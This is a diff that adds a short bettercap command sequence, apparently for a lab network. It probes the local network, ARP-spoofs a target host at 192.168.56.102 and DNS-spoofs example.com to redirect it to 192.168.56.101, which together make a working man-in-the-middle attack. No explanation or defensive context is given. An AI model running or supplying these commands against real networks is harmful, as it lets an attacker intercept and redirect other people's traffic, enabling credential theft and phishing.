@@ -1,0 +1,8 @@
+sudo bettercap -iface eth0
+net.probe on
+net.recon on
+set arp.spoof.targets 192.168.56.102
+arp.spoof on
+set dns.spoof.domains example.com
+set dns.spoof.address 192.168.56.101
+dns.spoof on
